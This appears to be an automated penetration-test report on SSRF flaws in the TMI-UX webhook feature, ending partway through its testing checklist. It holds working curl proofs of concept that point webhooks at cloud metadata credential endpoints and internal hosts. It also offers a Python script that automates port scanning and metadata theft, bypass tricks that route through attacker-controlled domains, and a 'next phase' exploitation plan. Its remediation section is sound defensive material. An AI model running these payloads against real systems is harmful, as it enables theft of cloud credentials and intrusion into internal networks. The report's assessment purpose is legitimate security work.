# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Multiple high-confidence Server-Side Request Forgery vulnerabilities were identified in the webhook management functionality, allowing authenticated users to force the backend server to make HTTP requests to arbitrary destinations including internal services, cloud metadata endpoints, and localhost resources.
- **Purpose of this Document:** This report provides comprehensive analysis of the application's outbound request mechanisms, identifies exploitable SSRF vulnerabilities with complete data flow traces, and documents the secure components that do not pose SSRF risk.

### Critical Findings Summary

**VULNERABLE Components:**
1. **Webhook Test Endpoint** - HIGH severity, externally exploitable
2. **Event-Triggered Webhooks** - HIGH severity, independently exploitable without test endpoint
3. **Addon-Webhook Integration** - MEDIUM severity, depends on webhook creation

**SAFE Components:**
- Angular HttpClient service layer (client-side only)
- OAuth/SAML authentication flows (browser redirects)
- Translation and framework loaders (static assets)
- WebSocket connections (environment-configured)
- Branding logo fetch (client-side with validation)
- PDF font manager (static assets)

### Attack Surface Overview

The TMI-UX application is an Angular 21.2 single-page application (SPA) that demonstrates strong architectural SSRF protection through client-side execution. However, the webhook management functionality introduces a critical server-side request mechanism that is vulnerable to SSRF attacks due to:

1. **Insufficient URL validation** - Only enforces HTTPS protocol, no private IP/localhost blocking
2. **Missing route guards** - `/admin/webhooks` lacks `adminGuard`, accessible to any authenticated user
3. **Multiple triggering mechanisms** - Test endpoint, event-based triggers, and addon invocation
4. **Semi-blind feedback** - Webhook delivery logs expose error messages and timing information

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Insufficient URL Validation

**Description:** The webhook URL validation only enforces HTTPS protocol via a frontend regex pattern (`/^https:\/\/.+/`), with no validation against private IP ranges, localhost addresses, or cloud metadata endpoints. This validation is client-side only and can be bypassed.

**Technical Details:**
- **Location:** `/app/repos/tmi-ux/src/app/pages/admin/webhooks/add-webhook-dialog/add-webhook-dialog.component.ts:212`
- **Validation Pattern:** `Validators.pattern(/^https:\/\/.+/)`
- **Missing Validations:**
  - Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  - Localhost/loopback (127.0.0.0/8, ::1, localhost)
  - Link-local addresses (169.254.0.0/16)
  - Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
  - DNS rebinding protection
  - IPv6 notation validation

**Exploitable URLs:**
```
https://127.0.0.1:8080/admin              // Localhost
https://10.0.0.5/internal-api              // Private IP (Class A)
https://172.16.0.1/admin-panel            // Private IP (Class B)
https://192.168.1.1/router                // Private IP (Class C)
https://169.254.169.254/latest/meta-data/ // AWS EC2 metadata
https://metadata.google.internal/computeMetadata/v1/ // GCP metadata
https://[::ffff:169.254.169.254]/         // IPv6-mapped IPv4
https://host.docker.internal:3000/        // Docker host access
```

**Implication:** Attackers can create webhooks pointing to internal resources, and the backend server will make HTTP requests to these destinations when webhooks are triggered.

**Representative Findings:** `SSRF-VULN-01`, `SSRF-VULN-02`, `SSRF-VULN-03`

---

### Pattern 2: Missing Authorization Controls

**Description:** The webhook management routes under `/admin/webhooks` lack the `adminGuard` route protection, allowing any authenticated user to access admin-only functionality. This is a critical authorization bypass that elevates the SSRF vulnerability from admin-exploitable to user-exploitable.

**Technical Details:**
- **Location:** `/app/repos/tmi-ux/src/app/app.routes.ts:117-123`
- **Current Protection:** Only `authGuard` (any authenticated user)
- **Missing Protection:** `adminGuard` (admin role required)
- **Comparison:** Other admin routes (users, settings, quotas) correctly implement `adminGuard`

**Code Evidence:**
```typescript
// VULNERABLE: /admin/webhooks route (Lines 117-123)
{
  path: 'webhooks',
  loadComponent: () => import('./pages/admin/webhooks/admin-webhooks.component')
    .then(c => c.AdminWebhooksComponent),
  // ❌ NO canActivate: [adminGuard] applied!
}

// SECURE: Other admin routes (Lines 91-100)
{
  path: 'users',
  loadComponent: () => import('./pages/admin/users/admin-users.component')
    .then(c => c.AdminUsersComponent),
  canActivate: [adminGuard],  // ✅ Admin guard properly applied
}
```

**Implication:** Standard authenticated users can create, test, and trigger webhooks, making SSRF vulnerabilities externally exploitable via public internet access to http://host.docker.internal:3000.

**Representative Finding:** `SSRF-VULN-01` (external exploitability confirmed)

---

### Pattern 3: Multiple Independent Triggering Mechanisms

**Description:** Webhooks can be triggered through multiple mechanisms beyond the explicit test endpoint, providing attackers with various exploitation paths. Event-based triggers allow on-demand SSRF exploitation without requiring the test endpoint functionality.

**Technical Details:**

**Trigger Method 1: Explicit Test Endpoint**
- **Endpoint:** `POST /webhooks/subscriptions/{id}/test`
- **Location:** `/app/repos/tmi-ux/src/app/core/services/webhook.service.ts:74-82`
- **Access:** Any authenticated user (due to missing route guard)

**Trigger Method 2: Event-Based Triggers** (Most Critical)
- **Mechanism:** Webhooks fire when application events occur
- **Available Events:** `/app/repos/tmi-ux/src/app/pages/admin/webhooks/add-webhook-dialog/add-webhook-dialog.component.ts:174-200`
- **Easily Triggered Events:**
  - `note.created` - User creates a note in their threat model
  - `note.updated` - User updates a note
  - `threat.created` - User creates a threat
  - `diagram.created` - User creates a diagram
  - `threat_model.created` - User creates a threat model

**Trigger Method 3: Addon Invocation**
- **Endpoint:** `POST /addons/{id}/invoke`
- **Location:** `/app/repos/tmi-ux/src/app/core/services/addon.service.ts:83-101`
- **Event:** `addon.invoked` webhook event fires
- **Requirements:** Attacker creates addon linked to malicious webhook

**Attack Scenario (Event-Based, No Test Endpoint Required):**
```
1. Attacker creates webhook with URL: https://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Attacker subscribes webhook to 'note.created' event
3. Attacker creates a note in their threat model
4. Backend server makes HTTP request to AWS metadata endpoint
5. Attacker repeats by creating additional notes (unlimited triggers)
6. Attacker views delivery logs via GET /webhooks/deliveries to see results
```

**Implication:** SSRF is exploitable without relying on the test endpoint, making it a persistent vulnerability that can be triggered on-demand through normal application operations.

**Representative Findings:** `SSRF-VULN-02`, `SSRF-VULN-03`

---

### Pattern 4: Semi-Blind Feedback via Delivery Logs

**Description:** Webhook delivery logs expose error messages, status codes, and timing information that can be leveraged to perform information disclosure and port scanning of internal networks. While full response bodies are not exposed, error messages provide sufficient feedback for effective SSRF exploitation.

**Technical Details:**
- **Endpoints:** 
  - `GET /webhooks/deliveries` - List all delivery attempts
  - `GET /webhooks/deliveries/{id}` - Get specific delivery details
- **Location:** `/app/repos/tmi-ux/src/app/generated/api-types.d.ts:5010-5048`

**WebhookDelivery Schema:**
```typescript
WebhookDelivery: {
  id: string;
  subscription_id: string;
  status: 'pending' | 'delivered' | 'failed';  // ✅ Success/failure indication
  attempts: number;                            // ✅ Retry count
  last_error?: string;                         // ✅ ERROR MESSAGE DISCLOSURE
  created_at: string;                          // ✅ Request timing
  delivered_at?: string | null;                // ✅ Response timing
}
```

**Information Disclosed:**
- ✅ **Error messages** - "Connection refused", "404 Not Found", "Timeout"
- ✅ **Success/failure status** - Whether request succeeded
- ✅ **Timing information** - Request and response timestamps
- ✅ **Retry attempts** - Number of delivery attempts
- ❌ **Response bodies** - NOT disclosed (prevents full data exfiltration)
- ❌ **Response headers** - NOT disclosed

**Attack Scenarios:**

**Port Scanning:**
```
1. Create webhook: https://10.0.0.5:22/
2. Trigger webhook, check delivery log
3. If last_error = "Connection refused" → Port closed
4. If status = "failed" with timeout → Port open, no HTTP service
5. If status = "failed" with "404" → HTTP service running
6. Repeat for ports 80, 443, 8080, 3000, etc.
```

**Service Discovery:**
```
1. Create webhook: https://10.0.0.5:8080/admin
2. If last_error contains "401 Unauthorized" → Service exists, requires auth
3. If last_error contains "403 Forbidden" → Service exists, endpoint forbidden
4. If status = "delivered" → Service accepted request (200 OK)
5. Map internal service landscape
```

**Authentication Testing:**
```
1. Test various internal endpoints
2. Differentiate between: No service / Service (unauthenticated) / Service (authenticated)
3. Identify which services are accessible without credentials
```

**Implication:** While not fully non-blind SSRF, the feedback mechanism is sufficient for reconnaissance, port scanning, service discovery, and authentication testing of internal networks.

**Representative Finding:** `SSRF-VULN-02` (semi-blind SSRF classification)

---

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture

**Backend HTTP Client:** Go-based microservice (separate from frontend codebase)
- **Technology:** Likely `net/http` package (Go standard library)
- **Evidence:** Backend API is documented as Go-based in reconnaissance
- **Location:** Not in frontend repository

**Request Flow:**
```
User (Browser) 
  → Frontend Angular SPA
  → Backend API (POST /webhooks/subscriptions/{id}/test OR event trigger)
  → Backend HTTP Client (Go)
  → Target URL (attacker-controlled via webhook)
```

**Key Characteristics:**
- Server-side request execution (not browser-based)
- Can reach internal networks, localhost, and cloud metadata endpoints
- Subject to backend's network policies and firewall rules
- No browser same-origin policy or CORS restrictions

### Webhook Event System

**Event Types:** 25+ event types across the application lifecycle
- **File:** `/app/repos/tmi-ux/src/app/pages/admin/webhooks/add-webhook-dialog/add-webhook-dialog.component.ts:174-200`

**Easily Triggerable Events (User can control):**
1. `threat_model.created` - Create threat model
2. `threat_model.updated` - Update threat model
3. `diagram.created` - Create diagram
4. `diagram.updated` - Update diagram
5. `threat.created` - Create threat
6. `threat.updated` - Update threat
7. `note.created` - Create note (easiest to trigger)
8. `note.updated` - Update note
9. `asset.created` - Create asset
10. `document.created` - Create document

**Triggering Frequency:**
- No rate limiting identified in frontend code
- Users can create unlimited notes/threats in their own threat models
- Each creation triggers subscribed webhooks
- Potential for automated exploitation via scripting

### Internal Service Discovery

**Docker Environment Context:**
- Target URL: `http://host.docker.internal:3000`
- Backend likely runs in containerized environment
- Access to `host.docker.internal` indicates Docker networking

**Probable Internal Targets:**
1. **Docker Host:** `host.docker.internal` (various ports)
2. **Cloud Metadata:**
   - AWS: `169.254.169.254/latest/meta-data/`
   - GCP: `metadata.google.internal/computeMetadata/v1/`
   - Azure: `metadata.azure.com/metadata/instance`
3. **Localhost Services:** `127.0.0.1` (backend's local services)
4. **Container Network:** Other containers in Docker network
5. **Private Networks:** `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`

### Attack Complexity Assessment

**Exploitation Difficulty:** LOW

**Prerequisites:**
- ✅ Valid authenticated account (any user, not admin)
- ✅ Network access to http://host.docker.internal:3000
- ✅ Basic understanding of HTTP and webhook concepts

**Exploitation Steps:**
```
1. Navigate to /admin/webhooks (accessible without admin role)
2. Click "Add Webhook"
3. Enter malicious URL (e.g., https://169.254.169.254/latest/meta-data/)
4. Select event type (e.g., 'note.created')
5. Create webhook
6. Trigger webhook by creating a note in threat model
7. View delivery logs via GET /webhooks/deliveries
8. Analyze error messages and timing for reconnaissance
9. Iterate with different URLs/ports for network mapping
```

**No Special Tools Required:**
- Standard web browser
- Basic understanding of internal IP ranges
- Knowledge of cloud metadata endpoints

### Credential Exposure Risk

**Cloud Metadata Endpoints:**

**AWS EC2 Instance Metadata:**
```
https://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
```
**Returns:** Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)

**GCP Compute Engine Metadata:**
```
https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
**Returns:** OAuth 2.0 access token for service account

**Azure Instance Metadata:**
```
https://metadata.azure.com/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
**Returns:** Azure AD access token for managed identity

**Impact:** Access to cloud credentials enables:
- Full account compromise
- Data exfiltration from cloud storage
- Lateral movement to other cloud resources
- Privilege escalation via cloud IAM
- Cost amplification attacks

---

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses against SSRF. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| **Angular HttpClient Service** | `/app/repos/tmi-ux/src/app/core/services/api.service.ts:78-207` | Client-side execution in browser context. Fixed base URL from environment configuration (`environment.apiUrl`). All requests target configured backend API only. Type-safe parameters prevent URL injection. | **SAFE** - Client-side only, no server-side request capability |
| **OAuth/SAML Authentication Flows** | `/app/repos/tmi-ux/src/app/auth/services/auth.service.ts:541-587` | Browser-based redirects to external OAuth/SAML providers. No server-side request from frontend. Backend handles token exchange with proper validation. Provider URLs from backend configuration, not user input. | **SAFE** - Browser redirects, backend-validated providers |
| **Translation Loader (i18n)** | `/app/repos/tmi-ux/src/app/i18n/transloco-loader.service.ts:10-12` | Loads static JSON files from `/assets/i18n/{lang}.json`. Language code constrained to supported languages (en, es, fr, etc.). Hardcoded asset path with no user input. | **SAFE** - Static assets only, whitelisted languages |
| **Framework Loader** | `/app/repos/tmi-ux/src/app/shared/services/framework.service.ts:32,52` | Loads threat modeling frameworks from `/assets/frameworks/{name}.json`. Framework names from hardcoded array: STRIDE, LINDDUN, CIA, DIE, PLOT4AI. No user-controlled paths. | **SAFE** - Static assets, hardcoded framework list |
| **WebSocket Connections** | `/app/repos/tmi-ux/src/app/core/services/websocket.adapter.ts:224-312` | WebSocket URL constructed from environment configuration. Uses browser WebSocket API (client-side connection). Token authentication via query parameter (backend-validated JWT). | **SAFE** - Environment-configured URL, client-side connection |
| **PDF Font Manager** | `/app/repos/tmi-ux/src/app/pages/tm/services/report/pdf-font-manager.ts:234-247` | Fetches TTF fonts from static asset paths. Font paths hardcoded in configuration (NotoSans-Regular.ttf, etc.). No user input controls font selection. Client-side fetch for PDF generation. | **SAFE** - Static assets, hardcoded font paths |
| **Branding Logo Fetch** | `/app/repos/tmi-ux/src/app/core/services/branding-config.service.ts:192-221` | Logo URL from backend `/config` endpoint (not user-controllable). Client-side fetch in browser (not server-side). Content-Type validation (image/png only). Size limit enforcement (2MB). Timeout protection (5 seconds). Graceful fallback to default logo on failure. | **SAFE** - Client-side fetch with validation, backend-controlled URL |

### Additional Secure Patterns Identified

**1. Static Asset Architecture**
- All static resources (images, fonts, translations, frameworks) served from `/assets/` directory
- Paths constructed with `path.join()` using constants (server.js)
- No dynamic path construction from user input
- Express.js `express.static()` middleware provides path traversal protection

**2. Environment-Based Configuration**
- Backend API URL fixed at application initialization
- WebSocket URL from environment configuration
- No runtime modification of base URLs
- Configuration sourced from `environment.ts` and server config

**3. Type Safety**
- TypeScript strict mode enabled
- All HTTP client methods use generics for type safety
- Query parameters type-constrained (string | number | boolean)
- Prevents URL injection through type mismatch

**4. Client-Side Execution Model**
- Angular SPA runs entirely in browser context
- No Node.js HTTP client in frontend code
- Browser security model provides inherent SSRF protection
- Same-origin policy and CORS restrict request destinations

---

## 5. Vulnerability Details and Exploitation Paths

### SSRF-VULN-01: Webhook Test Endpoint SSRF

**Vulnerability Type:** URL_Manipulation  
**Severity:** HIGH  
**Confidence:** HIGH  
**External Exploitability:** ✅ YES

**Source Endpoint:** `POST /webhooks/subscriptions/{id}/test`  
**Vulnerable Parameter:** Webhook `url` field (stored in webhook subscription)  
**Vulnerable Code Location:** `/app/repos/tmi-ux/src/app/core/services/webhook.service.ts:74-82`

**Data Flow Trace:**
```
1. User Input: Webhook creation dialog
   File: /app/repos/tmi-ux/src/app/pages/admin/webhooks/add-webhook-dialog/add-webhook-dialog.component.ts:218-256
   Validation: Validators.pattern(/^https:\/\/.+/) (Line 212)
   
2. Storage: POST /webhooks/subscriptions
   File: /app/repos/tmi-ux/src/app/core/services/webhook.service.ts:53-55
   Backend stores webhook URL in database
   
3. Trigger: POST /webhooks/subscriptions/{id}/test
   File: /app/repos/tmi-ux/src/app/core/services/webhook.service.ts:74-82
   Backend retrieves webhook URL from database
   
4. SSRF Sink: Backend HTTP client makes request
   Location: Backend Go service (not in frontend codebase)
   The backend makes HTTP request to stored webhook URL
```

**Missing Defense:** No URL validation against:
- Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Localhost (127.0.0.0/8, ::1, localhost, 0.0.0.0)
- Link-local addresses (169.254.0.0/16)
- Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
- Protocol restriction (frontend-only HTTPS enforcement, backend may accept HTTP)

**Exploitation Hypothesis:** An attacker can create a webhook with an internal URL (e.g., `https://169.254.169.254/latest/meta-data/iam/security-credentials/`), trigger the test endpoint, and force the backend server to make an HTTP request to the AWS metadata service, potentially exposing IAM credentials.

**Minimal PoC:**
```bash
# Step 1: Create webhook with malicious URL
curl -X POST http://host.docker.internal:3000/api/webhooks/subscriptions \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Webhook",
    "url": "https://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "events": ["threat_model.created"],
    "secret": "test123"
  }'

# Response: {"id": "webhook-uuid-123", ...}

# Step 2: Trigger webhook test
curl -X POST http://host.docker.internal:3000/api/webhooks/subscriptions/webhook-uuid-123/test \
  -H "Authorization: Bearer {token}"

# Step 3: View delivery log
curl http://host.docker.internal:3000/api/webhooks/deliveries \
  -H "Authorization: Bearer {token}"

# Expected: last_error or delivered_at indicating request was made to metadata endpoint
```

**Witness Payload:** `https://169.254.169.254/latest/meta-data/`

**Notes:**
- Missing `adminGuard` on `/admin/webhooks` route (app.routes.ts:117-123) allows any authenticated user to access
- Frontend validation is client-side only and can be bypassed via direct API call
- Backend must implement comprehensive URL validation

---

### SSRF-VULN-02: Event-Triggered Webhook SSRF (Semi-Blind)

**Vulnerability Type:** Webhook_Injection  
**Severity:** HIGH  
**Confidence:** HIGH  
**External Exploitability:** ✅ YES

**Source Endpoint:** Multiple event endpoints (e.g., `POST /threat_models/{id}/notes`)  
**Vulnerable Parameter:** Webhook `url` field (subscribed to application events)  
**Vulnerable Code Location:** Event system triggers webhook delivery (backend)

**Data Flow Trace:**
```
1. User Input: Webhook creation dialog
   File: /app/repos/tmi-ux/src/app/pages/admin/webhooks/add-webhook-dialog/add-webhook-dialog.component.ts:218-256
   Event selection: Lines 174-200 (25+ available events)
   
2. Storage: POST /webhooks/subscriptions
   File: /app/repos/tmi-ux/src/app/core/services/webhook.service.ts:53-55
   Backend stores webhook with subscribed events
   
3. Trigger: User performs action (e.g., create note)
   File: /app/repos/tmi-ux/src/app/pages/tm/services/threat-model.service.ts:1551
   POST /threat_models/{id}/notes
   Backend emits 'note.created' event
   
4. Event Processing: Backend webhook system
   Backend matches event to subscribed webhooks
   Retrieves webhook URL from database
   
5. SSRF Sink: Backend HTTP client makes request
   Backend makes HTTP request to webhook URL
   Stores delivery result in webhooks_deliveries table
   
6. Feedback: GET /webhooks/deliveries
   File: /app/repos/tmi-ux/src/app/core/services/webhook.service.ts:89-113
   Attacker views delivery logs with error messages
```

**Missing Defense:** Same as SSRF-VULN-01:
- No private IP validation
- No localhost validation  
- No cloud metadata blocking
- Client-side validation only

**Exploitation Hypothesis:** An attacker can create a webhook subscribed to easily-triggered events (e.g., `note.created`), perform normal application actions to trigger webhooks on-demand, and use delivery logs to gather information about internal services through error messages and timing, enabling semi-blind SSRF exploitation without requiring the test endpoint.

**Minimal PoC:**
```bash
# Step 1: Create webhook with malicious URL, subscribe to 'note.created'
curl -X POST http://host.docker.internal:3000/api/webhooks/subscriptions \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSRF Webhook",
    "url": "https://10.0.0.5:8080/admin",
    "events": ["note.created"],
    "secret": ""
  }'

# Response: {"id": "webhook-uuid-456", ...}

# Step 2: Create a note to trigger webhook (no test endpoint needed)
curl -X POST http://host.docker.internal:3000/api/threat_models/{tm-id}/notes \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Trigger Note",
    "content": "This triggers the webhook"
  }'

# Backend automatically triggers webhook to https://10.0.0.5:8080/admin

# Step 3: View delivery logs for reconnaissance
curl http://host.docker.internal:3000/api/webhooks/deliveries?subscription_id=webhook-uuid-456 \
  -H "Authorization: Bearer {token}"

# Expected response shows:
# - status: "failed" (if service doesn't respond)
# - last_error: "Connection refused" (if port closed)
# - last_error: "404 Not Found" (if service exists, endpoint not found)
# - status: "delivered" (if service accepted request)

# Step 4: Iterate for port scanning
# Create webhooks for ports 22, 80, 443, 3000, 5432, 6379, 8080, 9000, etc.
# Trigger via note creation
# Map internal network based on error messages
```

**Witness Payload:** `https://10.0.0.5:8080/`

**Suggested Exploit Technique:** `internal_service_access` with `port_scanning` for reconnaissance

**Notes:**
- This vulnerability is **independently exploitable** without the test endpoint
- Attackers can trigger webhooks unlimited times via normal CRUD operations
- Delivery logs provide semi-blind feedback for network reconnaissance
- No rate limiting observed in webhook event processing
- More covert than test endpoint (blends with normal application usage)

---

### SSRF-VULN-03: Addon Invocation Webhook SSRF

**Vulnerability Type:** Webhook_Injection  
**Severity:** MEDIUM  
**Confidence:** MEDIUM  
**External Exploitability:** ✅ YES (depends on webhook creation)

**Source Endpoint:** `POST /addons/{id}/invoke`  
**Vulnerable Parameter:** Addon's linked webhook `url`  
**Vulnerable Code Location:** `/app/repos/tmi-ux/src/app/core/services/addon.service.ts:83-101`

**Data Flow Trace:**
```
1. User Input: Addon creation dialog
   File: /app/repos/tmi-ux/src/app/pages/admin/addons/add-addon-dialog/add-addon-dialog.component.ts:291-310
   Webhook selection: Line 294 (webhook_id dropdown)
   
2. Prerequisite: Create webhook with malicious URL
   File: /app/repos/tmi-ux/src/app/core/services/webhook.service.ts:53-55
   POST /webhooks/subscriptions with internal URL
   Webhook must be subscribed to 'addon.invoked' event
   
3. Link: Create addon linked to webhook
   File: /app/repos/tmi-ux/src/app/core/services/addon.service.ts:60-67
   POST /addons with webhook_id parameter
   
4. Trigger: Invoke addon
   File: /app/repos/tmi-ux/src/app/core/services/addon.service.ts:83-101
   POST /addons/{id}/invoke
   Backend emits 'addon.invoked' event
   
5. Event Processing: Backend matches event to webhook
   Retrieves webhook URL associated with addon
   
6. SSRF Sink: Backend HTTP client makes request
   Backend makes HTTP request to webhook URL
```

**Missing Defense:** Same as SSRF-VULN-01 and SSRF-VULN-02

**Exploitation Hypothesis:** An attacker can create a webhook pointing to internal services and subscribe it to the `addon.invoked` event, then create an addon linked to that webhook. When the addon is invoked, the backend emits the event and triggers the webhook, forcing the server to make a request to the attacker-controlled URL. This provides an alternative SSRF triggering mechanism that doesn't rely on the test endpoint.

**Minimal PoC:**
```bash
# Step 1: Create webhook subscribed to 'addon.invoked'
curl -X POST http://host.docker.internal:3000/api/webhooks/subscriptions \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Addon SSRF Webhook",
    "url": "https://metadata.google.internal/computeMetadata/v1/",
    "events": ["addon.invoked"],
    "secret": ""
  }'

# Response: {"id": "webhook-uuid-789", ...}

# Step 2: Create addon linked to webhook
curl -X POST http://host.docker.internal:3000/api/addons \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSRF Addon",
    "webhook_id": "webhook-uuid-789",
    "description": "Test addon",
    "icon": "bug_report",
    "objects": ["ThreatModel"]
  }'

# Response: {"id": "addon-uuid-999", ...}

# Step 3: Invoke addon (triggers webhook)
curl -X POST http://host.docker.internal:3000/api/addons/addon-uuid-999/invoke \
  -H "Authorization: Bearer {token}" \
  -H "Content-Type: application/json" \
  -d '{
    "object_id": "{some-threat-model-id}",
    "object_type": "ThreatModel"
  }'

# Backend triggers webhook to https://metadata.google.internal/computeMetadata/v1/

# Step 4: View delivery logs
curl http://host.docker.internal:3000/api/webhooks/deliveries?subscription_id=webhook-uuid-789 \
  -H "Authorization: Bearer {token}"
```

**Witness Payload:** `https://metadata.google.internal/computeMetadata/v1/`

**Suggested Exploit Technique:** `cloud_metadata_retrieval`

**Notes:**
- Depends on successful webhook creation (SSRF-VULN-01)
- Provides alternative triggering mechanism via addon invocation
- Less obvious than direct webhook test
- May have usage quotas or rate limits on addon invocations
- Circular dependency: addon invocation → event → webhook → SSRF
- Confidence is MEDIUM due to dependency on webhook creation workflow

---

## 6. Exploitation Recommendations for Next Phase

### Priority 1: Immediate Exploitation Targets

**Target 1: AWS Metadata Credential Extraction**
```
Webhook URL: https://169.254.169.254/latest/meta-data/iam/security-credentials/
Trigger Method: Event-based (create note)
Expected Impact: Exposure of IAM role credentials
Confidence: HIGH (if backend runs on AWS EC2)
```

**Target 2: Internal Network Reconnaissance**
```
Webhook URLs: https://10.0.0.1:80/, https://10.0.0.1:443/, https://10.0.0.1:8080/, etc.
Trigger Method: Event-based (create notes for each)
Expected Impact: Port scanning and service discovery
Confidence: HIGH
Technique: Analyze error messages and timing differences
```

**Target 3: Docker Host Access**
```
Webhook URL: https://host.docker.internal:3000/
Trigger Method: Test endpoint or event-based
Expected Impact: Access to host machine services
Confidence: MEDIUM (depends on Docker networking configuration)
```

### Priority 2: Advanced Exploitation Techniques

**Technique 1: DNS Rebinding Attack**
```
1. Attacker controls DNS server for domain: attacker.com
2. Initial DNS resolution: attacker.com → 1.2.3.4 (public IP, passes validation)
3. Create webhook: https://attacker.com/
4. Backend resolves DNS: attacker.com → 1.2.3.4 (public), passes hypothetical IP check
5. Attacker changes DNS: attacker.com → 169.254.169.254
6. Backend makes request after TTL expires: now points to metadata
7. Bypasses DNS-based validation if backend doesn't re-validate
```

**Technique 2: IPv6 Notation Bypass**
```
Webhook URL: https://[::ffff:169.254.169.254]/latest/meta-data/
Encoding: IPv6-mapped IPv4 address
Bypasses: Regex validation expecting IPv4 dotted notation
```

**Technique 3: URL Encoding Bypass**
```
Webhook URL: https://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
Decodes to: https://169.254.169.254/
Bypasses: String matching for "169.254.169.254" if backend decodes before validation
```

**Technique 4: Blind Data Exfiltration via Timing**
```
1. Create webhook: https://attacker-controlled-server.com/?data={byte}
2. Attacker server responds with varying delays based on byte value
3. Measure delivered_at - created_at for timing information
4. Extract data byte-by-byte through timing side channel
5. Requires attacker-controlled server to receive callbacks
```

### Priority 3: Exploitation Automation

**Recommended Tooling:**
- Custom script to automate webhook creation and triggering
- Port scanner using webhook delivery logs as feedback
- Cloud metadata enumeration tool specific to AWS/GCP/Azure
- Credential extraction and validation pipeline

**Exploitation Flow:**
```python
# Pseudo-code for automated SSRF exploitation
def exploit_ssrf(token, target_url):
    # Create webhook
    webhook_id = create_webhook(token, target_url, events=['note.created'])
    
    # Trigger webhook via note creation
    threat_model_id = get_user_threat_model(token)
    create_note(token, threat_model_id, title=f"SSRF Test {target_url}")
    
    # Wait for delivery
    time.sleep(5)
    
    # Retrieve delivery logs
    deliveries = get_deliveries(token, webhook_id)
    
    # Analyze results
    for delivery in deliveries:
        if delivery.status == 'delivered':
            print(f"[+] {target_url} - Request succeeded (200 OK)")
        elif 'Connection refused' in delivery.last_error:
            print(f"[-] {target_url} - Port closed")
        elif '404' in delivery.last_error:
            print(f"[+] {target_url} - Service exists, endpoint not found")
        elif 'Timeout' in delivery.last_error:
            print(f"[?] {target_url} - Service may be slow or filtering")
    
    # Clean up
    delete_webhook(token, webhook_id)

# Port scan internal network
for port in [22, 80, 443, 3000, 5432, 6379, 8080, 9000]:
    exploit_ssrf(token, f"https://10.0.0.1:{port}/")

# Cloud metadata extraction
cloud_metadata_urls = [
    "https://169.254.169.254/latest/meta-data/",  # AWS
    "https://metadata.google.internal/computeMetadata/v1/",  # GCP
    "https://metadata.azure.com/metadata/instance",  # Azure
]
for url in cloud_metadata_urls:
    exploit_ssrf(token, url)
```

---

## 7. Backend Recommendations (Out of Scope for Analysis, Critical for Remediation)

While backend implementation is outside this analysis scope, the following defenses are **CRITICAL** for the backend to implement:

### URL Validation (Backend Must Implement)

```go
// Pseudo-code for comprehensive URL validation
func validateWebhookURL(urlStr string) error {
    parsed, err := url.Parse(urlStr)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    
    // 1. Protocol validation
    if parsed.Scheme != "https" {
        return errors.New("only HTTPS protocol allowed")
    }
    
    // 2. Resolve hostname to IP
    ips, err := net.LookupIP(parsed.Hostname())
    if err != nil {
        return fmt.Errorf("DNS resolution failed: %w", err)
    }
    
    // 3. Validate all resolved IPs
    for _, ip := range ips {
        if isPrivateIP(ip) {
            return errors.New("private IP addresses not allowed")
        }
        if isLocalhost(ip) {
            return errors.New("localhost not allowed")
        }
        if isLinkLocal(ip) {
            return errors.New("link-local addresses not allowed")
        }
        if isMetadataEndpoint(ip) {
            return errors.New("cloud metadata endpoints not allowed")
        }
    }
    
    return nil
}

func isPrivateIP(ip net.IP) bool {
    return ip.IsPrivate() || 
           ip.IsLoopback() || 
           ip.IsLinkLocalUnicast() ||
           ip.IsLinkLocalMulticast()
}

func isMetadataEndpoint(ip net.IP) bool {
    // Block 169.254.169.254 (AWS/Azure metadata)
    metadataIP := net.ParseIP("169.254.169.254")
    return ip.Equal(metadataIP)
}
```

### Request Controls

1. **Redirect Limiting:** Maximum 3-5 redirects, validate each redirect target
2. **Timeout Enforcement:** 5-10 second timeout for webhook requests
3. **Response Size Limiting:** Maximum 1MB response body
4. **DNS Rebinding Protection:** Re-validate IP before making request
5. **Connection Reuse Prevention:** Don't reuse connections for webhook requests

### Network Segmentation

1. **Egress Filtering:** Firewall rules blocking private IP ranges
2. **Dedicated Network:** Run webhook requests from isolated network segment
3. **Proxy Architecture:** Route webhook requests through dedicated egress proxy
4. **Network Policies:** Kubernetes/Docker network policies restricting container egress

---

## 8. Testing Checklist for Exploitation Phase

### Pre-Exploitation Setup

- [ ] Obtain valid authenticated user account (not admin)
- [ ] Confirm access to http://host.docker.internal:3000
- [ ] Verify webhook creation UI is accessible at `/admin/webhooks`
- [ ] Capture authentication token from browser storage
- [ ] Set up HTTP request tooling (curl, Postman, custom script)

### Exploitation Test Cases

**Test Case 1: Basic SSRF via Test Endpoint**
- [ ] Create webhook with URL `https://169.254.169.254/`
- [ ] Trigger test via `POST /webhooks/subscriptions/{id}/test`
- [ ] Verify backend attempts connection (check delivery logs)
- [ ] Expected: `last_error` or `status: delivered`

**Test Case 2: Event-Based SSRF (No Test Endpoint)**
- [ ] Create webhook with URL `https://10.0.0.1:8080/`, subscribe to `note.created`
